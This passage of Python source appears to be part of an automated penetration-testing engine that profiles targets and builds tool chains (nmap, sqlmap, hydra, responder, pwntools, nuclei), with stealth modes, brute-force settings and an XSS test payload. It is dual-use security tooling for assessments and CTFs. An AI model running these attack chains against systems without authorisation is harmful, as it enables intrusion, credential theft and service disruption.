                {"tool": "nmap", "priority": 1, "params": {"scan_type": "-sV -sC", "ports": "80,443,8080,8443"}},
                {"tool": "httpx", "priority": 2, "params": {"probe": True, "tech_detect": True}},
                {"tool": "katana", "priority": 3, "params": {"depth": 3, "js_crawl": True}},
                {"tool": "gau", "priority": 4, "params": {"include_subs": True}},
                {"tool": "waybackurls", "priority": 5, "params": {"get_versions": False}},
                {"tool": "nuclei", "priority": 6, "params": {"severity": "critical,high", "tags": "tech"}},
                {"tool": "dirsearch", "priority": 7, "params": {"extensions": "php,html,js,txt", "threads": 30}},
                {"tool": "gobuster", "priority": 8, "params": {"mode": "dir", "extensions": "php,html,js,txt"}}
            ],
            "api_testing": [
                {"tool": "httpx", "priority": 1, "params": {"probe": True, "tech_detect": True}},
                {"tool": "arjun", "priority": 2, "params": {"method": "GET,POST", "stable": True}},
                {"tool": "x8", "priority": 3, "params": {"method": "GET", "wordlist": "/usr/share/wordlists/x8/params.txt"}},
                {"tool": "paramspider", "priority": 4, "params": {"level": 2}},
                {"tool": "nuclei", "priority": 5, "params": {"tags": "api,graphql,jwt", "severity": "high,critical"}},
                {"tool": "ffuf", "priority": 6, "params": {"mode": "parameter", "method": "POST"}}
            ],
            "network_discovery": [
                {"tool": "arp-scan", "priority": 1, "params": {"local_network": True}},
                {"tool": "rustscan", "priority": 2, "params": {"ulimit": 5000, "scripts": True}},
                {"tool": "nmap-advanced", "priority": 3, "params": {"scan_type": "-sS", "os_detection": True, "version_detection": True}},
                {"tool": "masscan", "priority": 4, "params": {"rate": 1000, "ports": "1-65535", "banners": True}},
                {"tool": "enum4linux-ng", "priority": 5, "params": {"shares": True, "users": True, "groups": True}},
                {"tool": "nbtscan", "priority": 6, "params": {"verbose": True}},
                {"tool": "smbmap", "priority": 7, "params": {"recursive": True}},
                {"tool": "rpcclient", "priority": 8, "params": {"commands": "enumdomusers;enumdomgroups;querydominfo"}}
            ],
            "vulnerability_assessment": [
                {"tool": "nuclei", "priority": 1, "params": {"severity": "critical,high,medium", "update": True}},
                {"tool": "jaeles", "priority": 2, "params": {"threads": 20, "timeout": 20}},
                {"tool": "dalfox", "priority": 3, "params": {"mining_dom": True, "mining_dict": True}},
                {"tool": "nikto", "priority": 4, "params": {"comprehensive": True}},
                {"tool": "sqlmap", "priority": 5, "params": {"crawl": 2, "batch": True}}
            ],
            "comprehensive_network_pentest": [
                {"tool": "autorecon", "priority": 1, "params": {"port_scans": "top-1000-ports", "service_scans": "default"}},
                {"tool": "rustscan", "priority": 2, "params": {"ulimit": 5000, "scripts": True}},
                {"tool": "nmap-advanced", "priority": 3, "params": {"aggressive": True, "nse_scripts": "vuln,exploit"}},
                {"tool": "enum4linux-ng", "priority": 4, "params": {"shares": True, "users": True, "groups": True, "policy": True}},
                {"tool": "responder", "priority": 5, "params": {"wpad": True, "duration": 180}}
            ],
            "binary_exploitation": [
                {"tool": "checksec", "priority": 1, "params": {}},
                {"tool": "ghidra", "priority": 2, "params": {"analysis_timeout": 300, "output_format": "xml"}},
                {"tool": "ropper", "priority": 3, "params": {"gadget_type": "rop", "quality": 2}},
                {"tool": "one-gadget", "priority": 4, "params": {"level": 1}},
                {"tool": "pwntools", "priority": 5, "params": {"exploit_type": "local"}},
                {"tool": "gdb-peda", "priority": 6, "params": {"commands": "checksec\ninfo functions\nquit"}}
            ],
            "ctf_pwn_challenge": [
                {"tool": "pwninit", "priority": 1, "params": {"template_type": "python"}},
                {"tool": "checksec", "priority": 2, "params": {}},
                {"tool": "ghidra", "priority": 3, "params": {"analysis_timeout": 180}},
                {"tool": "ropper", "priority": 4, "params": {"gadget_type": "all", "quality": 3}},
                {"tool": "angr", "priority": 5, "params": {"analysis_type": "symbolic"}},
                {"tool": "one-gadget", "priority": 6, "params": {"level": 2}}
            ],
            "aws_security_assessment": [
                {"tool": "prowler", "priority": 1, "params": {"provider": "aws", "output_format": "json"}},
                {"tool": "scout-suite", "priority": 2, "params": {"provider": "aws"}},
                {"tool": "cloudmapper", "priority": 3, "params": {"action": "collect"}},
                {"tool": "pacu", "priority": 4, "params": {"modules": "iam__enum_users_roles_policies_groups"}}
            ],
            "kubernetes_security_assessment": [
                {"tool": "kube-bench", "priority": 1, "params": {"output_format": "json"}},
                {"tool": "kube-hunter", "priority": 2, "params": {"report": "json"}},
                {"tool": "falco", "priority": 3, "params": {"duration": 120, "output_format": "json"}}
            ],
            "container_security_assessment": [
                {"tool": "trivy", "priority": 1, "params": {"scan_type": "image", "severity": "HIGH,CRITICAL"}},
                {"tool": "clair", "priority": 2, "params": {"output_format": "json"}},
                {"tool": "docker-bench-security", "priority": 3, "params": {}}
            ],
            "iac_security_assessment": [
                {"tool": "checkov", "priority": 1, "params": {"output_format": "json"}},
                {"tool": "terrascan", "priority": 2, "params": {"scan_type": "all", "output_format": "json"}},
                {"tool": "trivy", "priority": 3, "params": {"scan_type": "config", "severity": "HIGH,CRITICAL"}}
            ],
            "multi_cloud_assessment": [
                {"tool": "scout-suite", "priority": 1, "params": {"provider": "aws"}},
                {"tool": "prowler", "priority": 2, "params": {"provider": "aws"}},
                {"tool": "checkov", "priority": 3, "params": {"framework": "terraform"}},
                {"tool": "terrascan", "priority": 4, "params": {"scan_type": "all"}}
            ],
            "bug_bounty_reconnaissance": [
                {"tool": "amass", "priority": 1, "params": {"mode": "enum", "passive": False}},
                {"tool": "subfinder", "priority": 2, "params": {"silent": True, "all_sources": True}},
                {"tool": "httpx", "priority": 3, "params": {"probe": True, "tech_detect": True, "status_code": True}},
                {"tool": "katana", "priority": 4, "params": {"depth": 3, "js_crawl": True, "form_extraction": True}},
                {"tool": "gau", "priority": 5, "params": {"include_subs": True}},
                {"tool": "waybackurls", "priority": 6, "params": {"get_versions": False}},
                {"tool": "paramspider", "priority": 7, "params": {"level": 2}},
                {"tool": "arjun", "priority": 8, "params": {"method": "GET,POST", "stable": True}}
            ],
            "bug_bounty_vulnerability_hunting": [
                {"tool": "nuclei", "priority": 1, "params": {"severity": "critical,high", "tags": "rce,sqli,xss,ssrf"}},
                {"tool": "dalfox", "priority": 2, "params": {"mining_dom": True, "mining_dict": True}},
                {"tool": "sqlmap", "priority": 3, "params": {"batch": True, "level": 2, "risk": 2}},
                {"tool": "jaeles", "priority": 4, "params": {"threads": 20, "timeout": 20}},
                {"tool": "ffuf", "priority": 5, "params": {"match_codes": "200,204,301,302,307,401,403", "threads": 40}}
            ],
            "bug_bounty_high_impact": [
                {"tool": "nuclei", "priority": 1, "params": {"severity": "critical", "tags": "rce,sqli,ssrf,lfi,xxe"}},
                {"tool": "sqlmap", "priority": 2, "params": {"batch": True, "level": 3, "risk": 3, "tamper": "space2comment"}},
                {"tool": "jaeles", "priority": 3, "params": {"signatures": "rce,sqli,ssrf", "threads": 30}},
                {"tool": "dalfox", "priority": 4, "params": {"blind": True, "mining_dom": True, "custom_payload": "alert(document.domain)"}}
            ]
        }

    def analyze_target(self, target: str) -> TargetProfile:
        """Analyze target and create comprehensive profile"""
        profile = TargetProfile(target=target)

        # Determine target type
        profile.target_type = self._determine_target_type(target)

        # Basic network analysis
        if profile.target_type in [TargetType.WEB_APPLICATION, TargetType.API_ENDPOINT]:
            profile.ip_addresses = self._resolve_domain(target)

        # Technology detection (basic heuristics)
        if profile.target_type == TargetType.WEB_APPLICATION:
            profile.technologies = self._detect_technologies(target)
            profile.cms_type = self._detect_cms(target)

        # Calculate attack surface score
        profile.attack_surface_score = self._calculate_attack_surface(profile)

        # Determine risk level
        profile.risk_level = self._determine_risk_level(profile)

        # Set confidence score
        profile.confidence_score = self._calculate_confidence(profile)

        return profile

    def _determine_target_type(self, target: str) -> TargetType:
        """Determine the type of target for appropriate tool selection"""
        # URL patterns
        if target.startswith(('http://', 'https://')):
            parsed = urllib.parse.urlparse(target)
            if '/api/' in parsed.path or parsed.path.endswith('/api'):
                return TargetType.API_ENDPOINT
            return TargetType.WEB_APPLICATION

        # IP address pattern
        if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target):
            return TargetType.NETWORK_HOST

        # Domain name pattern
        if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target):
            return TargetType.WEB_APPLICATION

        # File patterns
        if target.endswith(('.exe', '.bin', '.elf', '.so', '.dll')):
            return TargetType.BINARY_FILE

        # Cloud service patterns
        if any(cloud in target.lower() for cloud in ['amazonaws.com', 'azure', 'googleapis.com']):
            return TargetType.CLOUD_SERVICE

        return TargetType.UNKNOWN

    def _resolve_domain(self, target: str) -> List[str]:
        """Resolve domain to IP addresses"""
        try:
            if target.startswith(('http://', 'https://')):
                hostname = urllib.parse.urlparse(target).hostname
            else:
                hostname = target

            if hostname:
                ip = socket.gethostbyname(hostname)
                return [ip]
        except Exception:
            pass
        return []

    def _detect_technologies(self, target: str) -> List[TechnologyStack]:
        """Detect technologies using basic heuristics"""
        technologies = []

        # This is a simplified version - in practice, you'd make HTTP requests
        # and analyze headers, content, etc.

        # For now, return some common technologies based on target patterns
        if 'wordpress' in target.lower() or 'wp-' in target.lower():
            technologies.append(TechnologyStack.WORDPRESS)

        if any(ext in target.lower() for ext in ['.php', 'php']):
            technologies.append(TechnologyStack.PHP)

        if any(ext in target.lower() for ext in ['.asp', '.aspx']):
            technologies.append(TechnologyStack.DOTNET)

        return technologies if technologies else [TechnologyStack.UNKNOWN]

    def _detect_cms(self, target: str) -> Optional[str]:
        """Detect CMS type"""
        target_lower = target.lower()

        if 'wordpress' in target_lower or 'wp-' in target_lower:
            return "WordPress"
        elif 'drupal' in target_lower:
            return "Drupal"
        elif 'joomla' in target_lower:
            return "Joomla"

        return None

    def _calculate_attack_surface(self, profile: TargetProfile) -> float:
        """Calculate attack surface score based on profile"""
        score = 0.0

        # Base score by target type
        type_scores = {
            TargetType.WEB_APPLICATION: 7.0,
            TargetType.API_ENDPOINT: 6.0,
            TargetType.NETWORK_HOST: 8.0,
            TargetType.CLOUD_SERVICE: 5.0,
            TargetType.BINARY_FILE: 4.0
        }

        score += type_scores.get(profile.target_type, 3.0)

        # Add points for technologies
        score += len(profile.technologies) * 0.5

        # Add points for open ports
        score += len(profile.open_ports) * 0.3

        # Add points for subdomains
        score += len(profile.subdomains) * 0.2

        # CMS adds attack surface
        if profile.cms_type:
            score += 1.5

        return min(score, 10.0)  # Cap at 10.0

    def _determine_risk_level(self, profile: TargetProfile) -> str:
        """Determine risk level based on attack surface"""
        if profile.attack_surface_score >= 8.0:
            return "critical"
        elif profile.attack_surface_score >= 6.0:
            return "high"
        elif profile.attack_surface_score >= 4.0:
            return "medium"
        elif profile.attack_surface_score >= 2.0:
            return "low"
        else:
            return "minimal"

    def _calculate_confidence(self, profile: TargetProfile) -> float:
        """Calculate confidence score in the analysis"""
        confidence = 0.5  # Base confidence

        # Increase confidence based on available data
        if profile.ip_addresses:
            confidence += 0.1
        if profile.technologies and profile.technologies[0] != TechnologyStack.UNKNOWN:
            confidence += 0.2
        if profile.cms_type:
            confidence += 0.1
        if profile.target_type != TargetType.UNKNOWN:
            confidence += 0.1

        return min(confidence, 1.0)

    def select_optimal_tools(self, profile: TargetProfile, objective: str = "comprehensive") -> List[str]:
        """Select optimal tools based on target profile and objective"""
        target_type = profile.target_type.value
        effectiveness_map = self.tool_effectiveness.get(target_type, {})

        # Get base tools for target type
        base_tools = list(effectiveness_map.keys())

        # Apply objective-based filtering
        if objective == "quick":
            # Select top 3 most effective tools
            sorted_tools = sorted(base_tools, key=lambda t: effectiveness_map.get(t, 0), reverse=True)
            selected_tools = sorted_tools[:3]
        elif objective == "comprehensive":
            # Select all tools with effectiveness > 0.7
            selected_tools = [tool for tool in base_tools if effectiveness_map.get(tool, 0) > 0.7]
        elif objective == "stealth":
            # Select passive tools with lower detection probability
            stealth_tools = ["amass", "subfinder", "httpx", "nuclei"]
            selected_tools = [tool for tool in base_tools if tool in stealth_tools]
        else:
            selected_tools = base_tools

        # Add technology-specific tools
        for tech in profile.technologies:
            if tech == TechnologyStack.WORDPRESS and "wpscan" not in selected_tools:
                selected_tools.append("wpscan")
            elif tech == TechnologyStack.PHP and "nikto" not in selected_tools:
                selected_tools.append("nikto")

        return selected_tools

    def optimize_parameters(self, tool: str, profile: TargetProfile, context: Dict[str, Any] = None) -> Dict[str, Any]:
        """Enhanced parameter optimization with advanced intelligence"""
        if context is None:
            context = {}

        # Use advanced parameter optimizer if available
        if hasattr(self, '_use_advanced_optimizer') and self._use_advanced_optimizer:
            return parameter_optimizer.optimize_parameters_advanced(tool, profile, context)

        # Fallback to legacy optimization for compatibility
        optimized_params = {}

        # Tool-specific parameter optimization
        if tool == "nmap":
            optimized_params = self._optimize_nmap_params(profile, context)
        elif tool == "gobuster":
            optimized_params = self._optimize_gobuster_params(profile, context)
        elif tool == "nuclei":
            optimized_params = self._optimize_nuclei_params(profile, context)
        elif tool == "sqlmap":
            optimized_params = self._optimize_sqlmap_params(profile, context)
        elif tool == "ffuf":
            optimized_params = self._optimize_ffuf_params(profile, context)
        elif tool == "hydra":
            optimized_params = self._optimize_hydra_params(profile, context)
        elif tool == "rustscan":
            optimized_params = self._optimize_rustscan_params(profile, context)
        elif tool == "masscan":
            optimized_params = self._optimize_masscan_params(profile, context)
        elif tool == "nmap-advanced":
            optimized_params = self._optimize_nmap_advanced_params(profile, context)
        elif tool == "enum4linux-ng":
            optimized_params = self._optimize_enum4linux_ng_params(profile, context)
        elif tool == "autorecon":
            optimized_params = self._optimize_autorecon_params(profile, context)
        elif tool == "ghidra":
            optimized_params = self._optimize_ghidra_params(profile, context)
        elif tool == "pwntools":
            optimized_params = self._optimize_pwntools_params(profile, context)
        elif tool == "ropper":
            optimized_params = self._optimize_ropper_params(profile, context)
        elif tool == "angr":
            optimized_params = self._optimize_angr_params(profile, context)
        elif tool == "prowler":
            optimized_params = self._optimize_prowler_params(profile, context)
        elif tool == "scout-suite":
            optimized_params = self._optimize_scout_suite_params(profile, context)
        elif tool == "kube-hunter":
            optimized_params = self._optimize_kube_hunter_params(profile, context)
        elif tool == "trivy":
            optimized_params = self._optimize_trivy_params(profile, context)
        elif tool == "checkov":
            optimized_params = self._optimize_checkov_params(profile, context)
        else:
            # Use advanced optimizer for unknown tools
            return parameter_optimizer.optimize_parameters_advanced(tool, profile, context)

        return optimized_params

    def enable_advanced_optimization(self):
        """Enable advanced parameter optimization"""
        self._use_advanced_optimizer = True

    def disable_advanced_optimization(self):
        """Disable advanced parameter optimization (use legacy)"""
        self._use_advanced_optimizer = False

    def _optimize_nmap_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Nmap parameters"""
        params = {"target": profile.target}

        if profile.target_type == TargetType.WEB_APPLICATION:
            params["scan_type"] = "-sV -sC"
            params["ports"] = "80,443,8080,8443,8000,9000"
        elif profile.target_type == TargetType.NETWORK_HOST:
            params["scan_type"] = "-sS -O"
            params["additional_args"] = "--top-ports 1000"

        # Adjust timing based on stealth requirements
        if context.get("stealth", False):
            params["additional_args"] = params.get("additional_args", "") + " -T2"
        else:
            params["additional_args"] = params.get("additional_args", "") + " -T4"

        return params

    def _optimize_gobuster_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Gobuster parameters"""
        params = {"url": profile.target, "mode": "dir"}

        # Select wordlist based on detected technologies
        if TechnologyStack.PHP in profile.technologies:
            params["additional_args"] = "-x php,html,txt,xml"
        elif TechnologyStack.DOTNET in profile.technologies:
            params["additional_args"] = "-x asp,aspx,html,txt"
        elif TechnologyStack.JAVA in profile.technologies:
            params["additional_args"] = "-x jsp,html,txt,xml"
        else:
            params["additional_args"] = "-x html,php,txt,js"

        # Adjust threads based on target type
        if context.get("aggressive", False):
            params["additional_args"] += " -t 50"
        else:
            params["additional_args"] += " -t 20"

        return params

    def _optimize_nuclei_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Nuclei parameters"""
        params = {"target": profile.target}

        # Set severity based on context
        if context.get("quick", False):
            params["severity"] = "critical,high"
        else:
            params["severity"] = "critical,high,medium"

        # Add technology-specific tags
        tags = []
        for tech in profile.technologies:
            if tech == TechnologyStack.WORDPRESS:
                tags.append("wordpress")
            elif tech == TechnologyStack.DRUPAL:
                tags.append("drupal")
            elif tech == TechnologyStack.JOOMLA:
                tags.append("joomla")

        if tags:
            params["tags"] = ",".join(tags)

        return params

    def _optimize_sqlmap_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize SQLMap parameters"""
        params = {"url": profile.target}

        # Add database-specific options based on detected technologies
        if TechnologyStack.PHP in profile.technologies:
            params["additional_args"] = "--dbms=mysql --batch"
        elif TechnologyStack.DOTNET in profile.technologies:
            params["additional_args"] = "--dbms=mssql --batch"
        else:
            params["additional_args"] = "--batch"

        # Adjust aggressiveness
        if context.get("aggressive", False):
            params["additional_args"] += " --level=3 --risk=2"

        return params

    def _optimize_ffuf_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize FFuf parameters"""
        params = {"url": profile.target}

        # Set match codes based on target type
        if profile.target_type == TargetType.API_ENDPOINT:
            params["match_codes"] = "200,201,202,204,301,302,401,403"
        else:
            params["match_codes"] = "200,204,301,302,307,401,403"

        # Adjust threads
        if context.get("stealth", False):
            params["additional_args"] = "-t 10 -p 1"
        else:
            params["additional_args"] = "-t 40"

        return params

    def _optimize_hydra_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Hydra parameters"""
        params = {"target": profile.target}

        # Determine service based on open ports
        if 22 in profile.open_ports:
            params["service"] = "ssh"
        elif 21 in profile.open_ports:
            params["service"] = "ftp"
        elif 80 in profile.open_ports or 443 in profile.open_ports:
            params["service"] = "http-get"
        else:
            params["service"] = "ssh"  # Default

        # Set conservative parameters to avoid lockouts
        params["additional_args"] = "-t 4 -w 30"

        return params

    def _optimize_rustscan_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Rustscan parameters"""
        params = {"target": profile.target}

        # Adjust performance based on context
        if context.get("stealth", False):
            params["ulimit"] = 1000
            params["batch_size"] = 500
            params["timeout"] = 3000
        elif context.get("aggressive", False):
            params["ulimit"] = 10000
            params["batch_size"] = 8000
            params["timeout"] = 800
        else:
            params["ulimit"] = 5000
            params["batch_size"] = 4500
            params["timeout"] = 1500

        # Enable scripts for comprehensive scans
        if context.get("objective", "normal") == "comprehensive":
            params["scripts"] = True

        return params

    def _optimize_masscan_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Masscan parameters"""
        params = {"target": profile.target}

        # Intelligent rate limiting based on target type
        if context.get("stealth", False):
            params["rate"] = 100
        elif context.get("aggressive", False):
            params["rate"] = 10000
        else:
            # Default intelligent rate
            params["rate"] = 1000

        # Enable banners for service detection
        if context.get("service_detection", True):
            params["banners"] = True

        return params

    def _optimize_nmap_advanced_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize advanced Nmap parameters"""
        params = {"target": profile.target}

        # Select scan type based on context
        if context.get("stealth", False):
            params["scan_type"] = "-sS"
            params["timing"] = "T2"
            params["stealth"] = True
        elif context.get("aggressive", False):
            params["scan_type"] = "-sS"
            params["timing"] = "T4"
            params["aggressive"] = True
        else:
            params["scan_type"] = "-sS"
            params["timing"] = "T4"
            params["os_detection"] = True
            params["version_detection"] = True

        # Add NSE scripts based on target type
        if profile.target_type == TargetType.WEB_APPLICATION:
            params["nse_scripts"] = "http-*,ssl-*"
        elif profile.target_type == TargetType.NETWORK_HOST:
            params["nse_scripts"] = "default,discovery,safe"

        return params

    def _optimize_enum4linux_ng_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Enum4linux-ng parameters"""
        params = {"target": profile.target}

        # Enable comprehensive enumeration by default
        params["shares"] = True
        params["users"] = True
        params["groups"] = True
        params["policy"] = True

        # Add authentication if available in context
        if context.get("username"):
            params["username"] = context["username"]
        if context.get("password"):
            params["password"] = context["password"]
        if context.get("domain"):
            params["domain"] = context["domain"]

        return params

    def _optimize_autorecon_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize AutoRecon parameters"""
        params = {"target": profile.target}

        # Adjust scan depth based on objective
        if context.get("quick", False):
            params["port_scans"] = "top-100-ports"
            params["timeout"] = 180
        elif context.get("comprehensive", True):
            params["port_scans"] = "top-1000-ports"
            params["timeout"] = 600

        # Set output directory
        params["output_dir"] = f"/tmp/autorecon_{profile.target.replace('.', '_')}"

        return params

    def _optimize_ghidra_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Ghidra parameters"""
        params = {"binary": profile.target}

        # Adjust analysis timeout based on context
        if context.get("quick", False):
            params["analysis_timeout"] = 120
        elif context.get("comprehensive", True):
            params["analysis_timeout"] = 600
        else:
            params["analysis_timeout"] = 300

        # Set project name based on binary
        binary_name = os.path.basename(profile.target).replace('.', '_')
        params["project_name"] = f"hexstrike_{binary_name}"

        return params

    def _optimize_pwntools_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Pwntools parameters"""
        params = {"target_binary": profile.target}

        # Set exploit type based on context
        if context.get("remote_host") and context.get("remote_port"):
            params["exploit_type"] = "remote"
            params["target_host"] = context["remote_host"]
            params["target_port"] = context["remote_port"]
        else:
            params["exploit_type"] = "local"

        return params

    def _optimize_ropper_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Ropper parameters"""
        params = {"binary": profile.target}

        # Set gadget type and quality based on context
        if context.get("exploit_type") == "rop":
            params["gadget_type"] = "rop"
            params["quality"] = 3
        elif context.get("exploit_type") == "jop":
            params["gadget_type"] = "jop"
            params["quality"] = 2
        else:
            params["gadget_type"] = "all"
            params["quality"] = 2

        # Set architecture if known
        if context.get("arch"):
            params["arch"] = context["arch"]

        return params

    def _optimize_angr_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize angr parameters"""
        params = {"binary": profile.target}

        # Set analysis type based on context
        if context.get("symbolic_execution", True):
            params["analysis_type"] = "symbolic"
        elif context.get("cfg_analysis", False):
            params["analysis_type"] = "cfg"
        else:
            params["analysis_type"] = "static"

        # Add find/avoid addresses if provided
        if context.get("find_address"):
            params["find_address"] = context["find_address"]
        if context.get("avoid_addresses"):
            params["avoid_addresses"] = context["avoid_addresses"]

        return params

    def _optimize_prowler_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Prowler parameters"""
        params = {"provider": "aws"}

        # Set provider based on context or target analysis
        if context.get("cloud_provider"):
            params["provider"] = context["cloud_provider"]

        # Set profile and region
        if context.get("aws_profile"):
            params["profile"] = context["aws_profile"]
        if context.get("aws_region"):
            params["region"] = context["aws_region"]

        # Set output format and directory
        params["output_format"] = "json"
        params["output_dir"] = f"/tmp/prowler_{params['provider']}"

        return params

    def _optimize_scout_suite_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Scout Suite parameters"""
        params = {"provider": "aws"}

        # Set provider based on context
        if context.get("cloud_provider"):
            params["provider"] = context["cloud_provider"]

        # Set profile for AWS
        if params["provider"] == "aws" and context.get("aws_profile"):
            params["profile"] = context["aws_profile"]

        # Set report directory
        params["report_dir"] = f"/tmp/scout-suite_{params['provider']}"

        return params

    def _optimize_kube_hunter_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize kube-hunter parameters"""
        params = {"report": "json"}

        # Set target based on context
        if context.get("kubernetes_target"):
            params["target"] = context["kubernetes_target"]
        elif context.get("cidr"):
            params["cidr"] = context["cidr"]
        elif context.get("interface"):
            params["interface"] = context["interface"]

        # Enable active hunting if specified
        if context.get("active_hunting", False):
            params["active"] = True

        return params

    def _optimize_trivy_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Trivy parameters"""
        params = {"target": profile.target, "output_format": "json"}

        # Determine scan type based on target
        if profile.target.startswith(('docker.io/', 'gcr.io/', 'quay.io/')) or ':' in profile.target:
            params["scan_type"] = "image"
        elif os.path.isdir(profile.target):
            params["scan_type"] = "fs"
        else:
            params["scan_type"] = "image"  # Default

        # Set severity filter
        if context.get("severity"):
            params["severity"] = context["severity"]
        else:
            params["severity"] = "HIGH,CRITICAL"

        return params

    def _optimize_checkov_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize Checkov parameters"""
        params = {"directory": profile.target, "output_format": "json"}

        # Detect framework based on files in directory
        if context.get("framework"):
            params["framework"] = context["framework"]
        elif os.path.isdir(profile.target):
            # Auto-detect framework
            if any(f.endswith('.tf') for f in os.listdir(profile.target) if os.path.isfile(os.path.join(profile.target, f))):
                params["framework"] = "terraform"
            elif any(f.endswith('.yaml') or f.endswith('.yml') for f in os.listdir(profile.target) if os.path.isfile(os.path.join(profile.target, f))):
                params["framework"] = "kubernetes"

        return params

    def create_attack_chain(self, profile: TargetProfile, objective: str = "comprehensive") -> AttackChain:
        """Create an intelligent attack chain based on target profile"""
        chain = AttackChain(profile)

        # Select attack pattern based on target type and objective
        if profile.target_type == TargetType.WEB_APPLICATION:
            if objective == "quick":
                pattern = self.attack_patterns["vulnerability_assessment"][:2]
            else:
                pattern = self.attack_patterns["web_reconnaissance"] + self.attack_patterns["vulnerability_assessment"]
        elif profile.target_type == TargetType.API_ENDPOINT:
            pattern = self.attack_patterns["api_testing"]
        elif profile.target_type == TargetType.NETWORK_HOST:
            if objective == "comprehensive":
                pattern = self.attack_patterns["comprehensive_network_pentest"]
            else:
                pattern = self.attack_patterns["network_discovery"]
        elif profile.target_type == TargetType.BINARY_FILE:
            if objective == "ctf":
                pattern = self.attack_patterns["ctf_pwn_challenge"]
            else:
                pattern = self.attack_patterns["binary_exploitation"]
        elif profile.target_type == TargetType.CLOUD_SERVICE:
            if objective == "aws":
                pattern = self.attack_patterns["aws_security_assessment"]
            elif objective == "kubernetes":
                pattern = self.attack_patterns["kubernetes_security_assessment"]
            elif objective == "containers":
                pattern = self.attack_patterns["container_security_assessment"]
            elif objective == "iac":
                pattern = self.attack_patterns["iac_security_assessment"]
            else:
                pattern = self.attack_patterns["multi_cloud_assessment"]
        else:
            # Handle bug bounty specific objectives
            if objective == "bug_bounty_recon":
                pattern = self.attack_patterns["bug_bounty_reconnaissance"]
            elif objective == "bug_bounty_hunting":
                pattern = self.attack_patterns["bug_bounty_vulnerability_hunting"]
            elif objective == "bug_bounty_high_impact":
                pattern = self.attack_patterns["bug_bounty_high_impact"]
            else:
                pattern = self.attack_patterns["web_reconnaissance"]

        # Create attack steps
        for step_config in pattern:
            tool = step_config["tool"]
            optimized_params = self.optimize_parameters(tool, profile)

            # Calculate success probability based on tool effectiveness
            effectiveness = self.tool_effectiveness.get(profile.target_type.value, {}).get(tool, 0.5)
            success_prob = effectiveness * profile.confidence_score

            # Estimate execution time (simplified)
            time_estimates = {
                "nmap": 120, "gobuster": 300, "nuclei": 180, "nikto": 240,
                "sqlmap": 600, "ffuf": 200, "hydra": 900, "amass": 300,
                "ghidra": 300, "radare2": 180, "gdb": 120, "gdb-peda": 150,
                "angr": 600, "pwntools": 240, "ropper": 120, "one-gadget": 60,
                "checksec": 30, "pwninit": 60, "libc-database": 90,
                "prowler": 600, "scout-suite": 480, "cloudmapper": 300, "pacu": 420,
                "trivy": 180, "clair": 240, "kube-hunter": 300, "kube-bench": 120,
                "docker-bench-security": 180, "falco": 120, "checkov": 240, "terrascan": 200
            }
            exec_time = time_estimates.get(tool, 180)

            step = AttackStep(
                tool=tool,
                parameters=optimized_params,
                expected_outcome=f"Discover vulnerabilities using {tool}",
                success_probability=success_prob,
                execution_time_estimate=exec_time
            )

            chain.add_step(step)

        # Calculate overall chain metrics
        chain.calculate_success_probability()
        chain.risk_level = profile.risk_level

        return chain

# Global decision engine instance
decision_engine = IntelligentDecisionEngine()

# ============================================================================
# INTELLIGENT ERROR HANDLING AND RECOVERY SYSTEM (v11.0 ENHANCEMENT)
# ============================================================================

from enum import Enum
from dataclasses import dataclass
from typing import Callable, Union
import traceback
import time
import random

class ErrorType(Enum):
    """Enumeration of different error types for intelligent handling"""
    TIMEOUT = "timeout"
    PERMISSION_DENIED = "permission_denied"
    NETWORK_UNREACHABLE = "network_unreachable"
    RATE_LIMITED = "rate_limited"
    TOOL_NOT_FOUND = "tool_not_found"
    INVALID_PARAMETERS = "invalid_parameters"
    RESOURCE_EXHAUSTED = "resource_exhausted"
    AUTHENTICATION_FAILED = "authentication_failed"
    TARGET_UNREACHABLE = "target_unreachable"
    PARSING_ERROR = "parsing_error"
    UNKNOWN = "unknown"

class RecoveryAction(Enum):
    """Types of recovery actions that can be taken"""
    RETRY_WITH_BACKOFF = "retry_with_backoff"
    RETRY_WITH_REDUCED_SCOPE = "retry_with_reduced_scope"
    SWITCH_TO_ALTERNATIVE_TOOL = "switch_to_alternative_tool"
    ADJUST_PARAMETERS = "adjust_parameters"
    ESCALATE_TO_HUMAN = "escalate_to_human"
    GRACEFUL_DEGRADATION = "graceful_degradation"
    ABORT_OPERATION = "abort_operation"

@dataclass
class ErrorContext:
    """Context information for error handling decisions"""
    tool_name: str
    target: str
    parameters: Dict[str, Any]
    error_type: ErrorType
    error_message: str
    attempt_count: int
    timestamp: datetime
    stack_trace: str
    system_resources: Dict[str, Any]
    previous_errors: List['ErrorContext'] = field(default_factory=list)

@dataclass
class RecoveryStrategy:
    """Recovery strategy with configuration"""
    action: RecoveryAction
    parameters: Dict[str, Any]
    max_attempts: int
    backoff_multiplier: float
    success_probability: float
